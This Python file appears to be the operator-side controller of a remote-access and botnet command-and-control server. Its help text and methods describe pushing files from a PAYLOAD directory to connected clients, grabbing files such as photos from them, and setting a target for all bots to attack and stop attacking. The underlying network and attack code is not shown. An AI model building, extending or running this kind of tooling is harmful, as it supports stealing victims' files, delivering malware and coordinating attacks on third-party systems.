from threading import Thread


class BasicControler(Thread):
    def __init__(self, pipe, server_callback):
        super().__init__(daemon=True)
        self.pipe = pipe
        self.Server = server_callback
        self.name = self.Server.name
    
    def check_signal(self):
        check = self.pipe.poll
        if check:
            recv = self.pipe.recv()
            return recv
        else:
            return None
    
    def blacklist_cmd(self, cmd):
        if cmd[0] == "black" and len(cmd) == 1:
            self.Server.show_blacklist()
        elif cmd[1] == "a":
            self.Server.add2blacklist(cmd[2])
        elif cmd[1] == "r":
            self.Server.remove_from_blacklist(cmd[2])

    
    def _base_cmd(self, cmd):
        self.Server.Msg(f"\n[{self.name}-DEV] 'BASE_COMMAND' : {cmd}", dev=True)
        if cmd[0] == "start":
            self.Server.listening()
        elif cmd[0] == "stop":
            self.Server._listening_FLAG.clear()
        elif cmd[0] == "black":
            self.blacklist_cmd(cmd)
        elif cmd[0] == "show":
            self.Server.show_clients()
        elif cmd[0] == "conf":
            self.Server.Msg(self.Server.show_config(), unpack=True)
        elif cmd[0].startswith("@"):
            self.Server.Msg("SEND MSG")
            self.Server._send_msg(" ".join(cmd[1:]), cmd[0].lstrip("@"))
        else:
            self.Server.Msg(f"\n[{self.name}] Unknown Command")
    
    def base_cmd(self, cmd):
        return self._base_cmd(cmd)

    
    def run(self):
        while True:
            cmd = self.check_signal()
            if not cmd:
                continue
            else:
                self.base_cmd(cmd)
    
    def _help(self):
        hilfe = f"\n--------------------------------- Basic Server Commands ---------------------------------\n"
        hilfe += "---   ss start                - Start Server Listening\n"
        hilfe += "---   ss stop                 - Stop Server Listening\n"
        hilfe += "---   ss conf                 - Show Server Config\n"
        hilfe += "---   ss show                 - Show connected Clients\n"
        hilfe += "---   ss black                - Show Blacklist\n"
        hilfe += '---   ss "black a <ip>"        - Add IP to Blacklist\n'
        # hilfe += '---   ss "save <client_id>"   - Save Info Client into log files\n'
        # hilfe += '                                You can use syntax: ss "save ALL" to save all clients\n'
        hilfe += '---   ss "@<client_ID> <msg>  - Send message to client. ex: ss "@2 Hello World"\n'
        hilfe += '                              - You can use syntax: ss "@ALL Hello World"  - Send message to all clients\n' 
        # self.server.Msg(hilfe, level=True)
        return hilfe
    
    def help(self):
        hilfe = self._help()
        hilfe_s = self.Server.help()
        return hilfe + hilfe_s


class LooterControler(BasicControler):
    def __init__(self, pipe, server_callback):
        super().__init__(pipe, server_callback)
    
    def base_cmd(self, cmd):
        if cmd[0] == "up":
            self.Server.upload_file(cmd[1], cmd[2])
        else:
            self._base_cmd(cmd)
    
    def help(self):
        hilfe = self._help()
        hilfe_s = self.Server.help()
        hilfe += "\n---------------------------------- Looter Commands ---------------------------------\n"
        hilfe += '---   ss "up <client_id> <file_name>"     - Upload file to client\n'
        hilfe += '---   ex: ss "up 3 file.exe"              - Send file.exe to client no3.\n'
        hilfe += "---       !!!!! File must be in PAYLOAD directory !!!!\n\n"
        hilfe += "-------------------------------------------------------------------------------\n"
        hilfe += '--- ss "@<client_id> grab <file_name>"    - Download file from client\n'
        hilfe += '--- ex: ss "@4 grab photo.jpg"            - Download "photo.jpg" from client no4\n'
        return hilfe + hilfe_s

class BotControler(BasicControler):
    def __init__(self, pipe, server_callback):
        super().__init__(pipe, server_callback)
    
    def base_cmd(self, cmd):
        if cmd[0] == "tar":
            self.Server.target = cmd[1]
            self.Server.Msg(f"\n[{self.Server.name}] Set Auto-Target: {cmd[1]}", level=True)
            return True
        elif cmd[0] == "ATT":
            self.Server.Msg(f"\n[{self.Server.name}] Send attack to all clients", level=True)
            self.Server.signal_attack()
            return True
        elif cmd[0] == "stp":
            self.Server.Msg(f"\n[{self.Server.name}] Send signal to stop attack", level=True)
            self.Server.stop_attack()
            return True
        else:
            self._base_cmd(cmd)
    

